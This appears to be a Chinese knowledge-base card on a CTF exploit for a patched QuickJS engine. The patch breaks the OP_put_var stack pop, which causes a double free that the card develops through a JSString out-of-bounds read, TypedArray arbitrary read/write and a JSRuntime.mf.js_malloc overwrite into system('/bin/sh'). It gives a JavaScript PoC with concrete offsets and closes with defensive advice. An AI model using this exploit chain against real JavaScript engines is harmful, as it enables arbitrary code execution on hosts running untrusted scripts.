---
id: binary-pwn-heap-quickjs-put-var-double-pop-uaf-jsruntime-hijack
title: QuickJS 补丁引入的双重弹栈 UAF：OP_put_var 异常路径重复释放，经 JSString 越界泄露与 TypedArray 任意读写劫持 JSRuntime.mf 执行 system("/bin/sh")
type: scenario
domain: binary
path: binary/pwn/heap
technique: quickjs-put-var-double-pop-uaf-jsruntime-hijack
tags:
- quickjs
- javascript-engine
- uaf
- double-free
- typed-array
- jsstring
- oob-read
- arbitrary-read-write
- jsruntime
- heap-exploit
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T13:37:29+08:00'
  notes: 已对照原文全文与2张图核对：patch 将 OP_put_var 两处 sp-- 合并到分支后、异常路径重复弹栈/释放、Object.defineProperty 抛异常 setter 触发、JSString len 改 0x10000 越界读、Uint32Array(0x48/4) 模板与 uaf_view[14]/[15] 任意 32 位读写、JSRuntime 扫描特征 0x100000/+0x20==0x4 与 -0xd8、elf_base-0x15255、libc-0xadd30、mf.js_malloc=system+0x58750、malloc_state 写 /bin/sh 均与原文代码一致；图02 显示 JSRuntime/elf/libc 地址。已修正‘原文运行后获得 shell’的过度表述：截图仅到地址打印后 ^C，未见 shell；卡内 PoC 补充 new Uint32Array 触发。未验证点：PoC 未本机复跑，压缩 PoC 省略 JSString 泄露阶段；原文为 CTF patch 无 CVE/版本，无 sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-quickjs-put-var-double-pop-uaf-jsruntime-hijack/
draft: false
kb_aliases:
- QuickJS UAF
- qjs pwn
- OP_put_var 双重弹栈
- JSString 越界读取
- TypedArray 任意读写
- JSRuntime js_malloc 劫持
- QuickJS getshell
---

## 一句话结论

在 QuickJS 中被错误修改的 `OP_put_var` 弹栈逻辑会让 `JS_SetPropertyInternal` 抛异常时值仍留在执行栈上，异常清理路径再次弹出并释放同一 `JSValue`，造成引用计数被多减、double free/UAF；利用者用被 UAF 的 `JSString` 做越界读泄露堆指针，堆喷同尺寸 `TypedArray(JSObject)` 并劫持其 `u.array.u.ptr` 获得任意 32 位读写，随后定位 `JSRuntime`、泄露 ELF/libc 基址，最终把 `JSRuntime.mf.js_malloc` 改成 `system`、把 `malloc_state` 改成 `/bin/sh`，下一次分配即执行 `system("/bin/sh")` 获得 shell。

## 原理

- **补丁改坏栈平衡**：`JS_CallInternal` 的 `OP_put_var` 分支原本在 `JS_SetPropertyInternal(...)` 返回后根据结果分别 `sp--`；被分析的 patch 把两处 `sp--` 合并到 `if/else` 之后。这样当 `JS_SetPropertyInternal` 返回 `< 0` 并 `goto exception` 时，会跳过公共的 `sp--`。
- **重复释放**：`JS_SetPropertyInternal` 在 setter 抛异常等失败路径上已经对传入的 `val` 做过 `JS_FreeValue`；由于栈指针没有递减，异常处理循环 `while (sp > stack_buf) { JSValue val = *--sp; JS_FreeValue(ctx, val); ... }` 会再次弹出同一个 `JSValue` 并再次 `JS_FreeValue`，引用计数被多减，对象被提前释放，形成 double free/UAF。
- **触发方式**：用 `Object.defineProperty(globalThis, 'vuln_var', {set(){throw new Error(...)}})` 给全局变量安装抛异常的 setter，再执行 `vuln_var = target_obj`，强制走 `JS_SetPropertyInternal` 的异常返回路径；连续触发两次即可让目标对象进入已释放状态。
- **JSString 越界读**：QuickJS 的 `JSString` 头部包含 `len`（31 位长度）与 `is_wide_char` 等字段。利用 UAF 复用/篡改字符串对象的头部，把长度改大（原文用 `0x10000`），再通过 `substring()` 读取超出原字符串内容的内存，配合 `DataView` 把每 8 字节转换成两个 32 位整数，扫描堆上的特征值（如 `/bin`、`/sh` 标记、`0x100000`）定位堆地址与结构体。
- **TypedArray 任意读写**：`typed_array_init()` 把 `p->u.array.u.ptr` 设为 `abuf->data + offset`，`p->u.array.count` 设为元素数。堆喷大量同尺寸 `Uint32Array(0x48/4)` 并复用 UAF 槽位后，攻击者可以控制某个 `JSObject` 的 `typed_array`/`u.array` 字段；把 `u.array.u.ptr` 改成任意地址后，对该 TypedArray 的读写就变成任意 32 位读（`aar32`）和任意 32 位写（`aaw32`）。
- **泄露 ELF 与 libc**：QuickJS 的 `JSRuntime` 起始处是 `JSMallocFunctions mf`，其中的 `js_malloc/js_free/js_realloc/js_malloc_usable_size` 默认指向 ELF 的 text 段。扫描堆找到 `JSRuntime` 后读取 `mf.js_malloc` 指针，减去该构建的固定偏移得到 ELF 基址；再读取 ELF 中某个 GOT 项（如 `elf_base + 0x129c00`）得到 libc 地址，减去对应符号偏移得到 libc 基址。
- **劫持执行流**：`JSMallocFunctions.js_malloc(JSMallocState *s, size_t size)` 的第一个参数是 `JSRuntime` 内的 `malloc_state` 指针。把 `mf.js_malloc` 覆盖为 libc `system`，把 `malloc_state` 所在内存写成 `"/bin/sh\0"`，随后触发任意新的堆分配（如 `new Uint32Array(...)`），QuickJS 调用 `js_malloc(&rt->malloc_state, size)` 即等价于 `system("/bin/sh")`。
- **为什么可行**：整个链不需要执行任意原生代码即可完成地址泄露与任意读写；QuickJS 的对象结构（`JSObject`/`JSString`/`JSRuntime`）布局固定且在同一次运行中可预测，UAF 提供了改写这些结构的机会；ASLR 通过 `JSRuntime.mf` 与 GOT 的两次泄露被绕过。
- **前提与边界**：该 patch 是比赛/审计环境中的自定义修改，并非某个官方发布版本的已知 CVE；偏移（`0x15255`、`0x129c00`、`0xadd30`、`0x58750` 等）与编译选项、QuickJS 版本强相关，换构建需要重新确定。原文截图为本地编译的 qjs 执行完整 exp，成功打印 JSRuntime/ELF/libc 地址。

## 触发条件

- 目标运行的是包含该错误 `OP_put_var` 弹栈修改的 QuickJS 构建（原文为 CTF 提供的 patch 后源码）。
- 攻击者能在该引擎中执行任意 JavaScript（如 qjs 运行恶意脚本、嵌入式应用执行用户脚本）。
- 引擎未启用会阻断该利用链的额外缓解（独立进程沙箱、CFI、堆隔离等）；ASLR 存在但可通过泄露绕过。
- 攻击者知道目标构建的结构体偏移与符号偏移（或能通过泄露/指纹推导）。
- UAF 触发依赖可对全局变量安装抛异常的 setter，且目标脚本运行在非严格模式或允许该属性定义。

## 利用步骤

1. 编译带 patch 的 QuickJS；为调试方便可在 `OP_debugger` 处插桩（输出当前函数名并 `raise(SIGTRAP)`），避免用 `sleep()` 等待附加。
2. 定义工具函数：`hex/log/sleep/stringToHex/u64` 拆装等。
3. 堆布局：创建多个 `Uint32Array(0x100)` 和 `ArrayBuffer(0x100)` 派生的 `target_obj`，写入 `/bin`、`/sh` 特征值；用 `Object.defineProperty` 给 `vuln_var` 安装抛异常 setter。
4. 触发 UAF：执行 `vuln_var = target_obj` 两次，使 `target_obj` 被重复释放；随后分配 `uaf_view = new Uint32Array(0x48/4)` 复用释放槽位。
5. 泄露与任意读写：构造被 UAF 的 `JSString`（长度字段改为 `0x10000`），用 `substring` 扫描堆中堆喷的 `TypedArray(JSObject)` 特征，提取模板结构；把 `uaf_view[14]/[15]` 当作目标指针，读写即落到 `target_obj[0]`，得到 `aar32`/`aaw32`。
6. 扫描 `JSRuntime`：以泄露的堆指针为起点，在 ±0x30000 范围内按 8 字节步进读取，匹配 `+0x0 == 0x100000` 且 `+0x20 == 0x4` 的特征，命中地址减 `0xd8` 得到 `JSRuntime` 基址。
7. 泄露基址：读 `JSRuntime[0]` 的 `mf.js_malloc`，减 `0x15255` 得 ELF 基址；读 `elf_base+0x129c00` 的 GOT 项，减 `0xadd30` 得 libc 基址。
8. 劫持：`aaw32(JSRuntime, libc_base+0x58750)` 覆盖 `mf.js_malloc` 为 `system`；`aaw32(JSRuntime+0x20, "/bin")`、`aaw32(JSRuntime+0x24, "/sh")` 把 `malloc_state` 写成 `/bin/sh\0`；触发新分配（如创建新 TypedArray）执行 `system("/bin/sh")`。
9. 验证：原文运行后打印 `JSRuntime`、`elf base`、`libc base`，随后源码进入 `sleep(10000)`（循环内 `new Date()` 本身也会触发分配）；原文截图未展示 shell/命令回显，卡片 PoC 用 `new Uint32Array(0x10)` 显式触发分配。

## PoC

以下为压缩后的核心链（完整脚本见原文；偏移按原文构建，换版本需重算）：

```javascript
function stringToHex(str) {
    const buffer = new ArrayBuffer(str.length);
    const view = new DataView(buffer);
    for (let i = 0; i < str.length; i++) view.setUint8(i, str.charCodeAt(i));
    return view.getUint32(0, true);
}

let target_obj, uaf_view;
const tas = [];

function trigger_uaf() {
    for (let i = 0; i < 10; i++) {
        const ta = new Uint32Array(0x100);
        ta[0] = 0x6e69622f; ta[1] = 0x68732f;   // "/bin", "/sh"
        tas.push(ta);
    }
    const buffer = new ArrayBuffer(0x100);
    target_obj = new Uint32Array(buffer);
    target_obj[0] = 0xaaaaaaaa; target_obj[1] = 0xbbbbbbbb;

    Object.defineProperty(globalThis, 'vuln_var', {
        set: function(val) { throw new Error("assignment failed!"); },
        configurable: true
    });
    try { vuln_var = target_obj; } catch (e) {}   // 第一次：异常路径重复释放
    try { vuln_var = target_obj; } catch (e) {}   // 第二次：制造 UAF
}

function aar32(lo, hi) { uaf_view[14] = lo; uaf_view[15] = hi; return target_obj[0]; }
function aaw32(lo, hi, val) { uaf_view[14] = lo; uaf_view[15] = hi; target_obj[0] = val; }

// 1) 用 UAF 的 JSString 越界读，扫描堆喷的 TypedArray 结构，得到模板
//    （原文 leak_info_by_jsstring：把字符串长度字段改为 0x10000，
//      substring 每 8 字节匹配 0x6e69622f/0x68732f 与 0x00000001/0x001b0d00）
// 2) 把模板写进 uaf_view，设置 uaf_view[14]/[15] 为任意地址
trigger_uaf();
uaf_view = new Uint32Array(0x48 / 4); /* 实际由 leak_info_by_jsstring 返回的模板填充 */

// 3) 扫描 JSRuntime：+0x0 == 0x100000 且 +0x20 == 0x4
let addr_lo = uaf_view[4], addr_hi = uaf_view[5], rt = [];
for (let i = 0; i < 0x30000; i += 8) {
    if (aar32(addr_lo + i, addr_hi) == 0x100000 &&
        aar32(addr_lo + i + 0x20, addr_hi) == 0x4) {
        rt = [addr_lo + i - 0xd8, addr_hi]; break;
    }
    if (aar32(addr_lo - i, addr_hi) == 0x100000 &&
        aar32(addr_lo - i + 0x20, addr_hi) == 0x4) {
        rt = [addr_lo - i - 0xd8, addr_hi]; break;
    }
}

// 4) 泄露 ELF / libc 基址
const elf_lo = aar32(rt[0], rt[1]) - 0x15255;
const elf_hi = aar32(rt[0] + 4, rt[1]);
const libc_lo = aar32(elf_lo + 0x129c00, elf_hi) - 0xadd30;
const libc_hi = aar32(elf_lo + 0x129c00 + 4, elf_hi);

// 5) 覆盖 mf.js_malloc = system，malloc_state = "/bin/sh"
aaw32(rt[0], rt[1], libc_lo + 0x58750);          // rt->mf.js_malloc = system
aaw32(rt[0] + 4, rt[1], libc_hi);
aaw32(rt[0] + 0x20, rt[1], 0x6e69622f);          // rt->malloc_state = "/bin"
aaw32(rt[0] + 0x24, rt[1], 0x68732f);            // "sh\0"

sleep(1000);
new Uint32Array(0x10);                            // 触发 js_malloc(rt->malloc_state, ...) -> system("/bin/sh")
```

## 变体与关联

- 变体（任意读写载体）：不劫持 `TypedArray`，也可以改用 `ArrayBuffer`、`DataView` 或其他带 `u.array.u.ptr` 的快速数组/对象；核心是找到可控制指针字段且能稳定复用的 `JSObject`。
- 变体（泄露目标）：除 `JSRuntime.mf` 外，还可从函数对象 `JS_CLASS_C_FUNCTION` 的 `cfunc.c_function`、`JS_CLASS_BYTECODE_FUNCTION` 等结构泄露代码指针；也可通过 `JSString` 越界读直接搜 ELF/libc 指针。
- 变体（触发点）：任何被改坏 `sp` 平衡的字节码分支（`OP_put_var`、`OP_put_loc`、`OP_set_name` 等）都可能产生同类重复释放；审计时应关注异常路径与公共弹栈逻辑的交错。
- 关联：[[binary-pwn-forth-dictionary-uaf-tcache-fake-word]]（语言 VM 的 UAF → 伪造结构劫持）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（UAF 后函数指针劫持的通用模式）、[[binary-pwn-heap-uaf-struct-reuse-data-pointer]]（结构体复用取得任意读写）、[[binary-pwn-browser-j2v8-thehole-map-corruption-wasm-rwx]]（另一 JS 引擎的结构破坏利用）。
- 边界：该漏洞来自比赛 patch，非官方版本 CVE；利用偏移依赖编译产物；若目标启用独立进程沙箱/CFI，需额外的逃逸或绕过步骤。

## 检测与防御

- 引擎开发：`sp` 的调整必须与异常路径严格配对；在 `goto exception` 前恢复栈平衡，或用统一的 `n_pop/n_push` 元数据驱动弹栈，避免在分支间移动 `sp--`；为 `JS_SetPropertyInternal` 等可能释放 `val` 的调用建立“所有权转移”约定。
- 测试：用 ASan/UBSan 与 fuzz（libFuzzer/AFL）覆盖所有 `OP_put_*`/异常路径，重点检查 double free、refcount underflow；对 setter 抛异常组合做回归用例。
- 加固：在独立进程/容器中运行不可信 JS，限制文件系统与网络；启用 ASLR、CFI/CET、堆隔离（如 PartitionAlloc 类分配器）提高利用成本；及时跟进引擎安全补丁。
- 检测：运行时监控 JS 引擎进程出现异常堆分配/释放模式、短时间内大量同尺寸 TypedArray 分配、读取非自身映射的内存（段错误/ASan 报告）；对嵌入式产品，检查是否在进程内直接执行用户脚本。
- 说明：该利用链用于授权渗透测试与 CTF，不应在未授权环境使用。
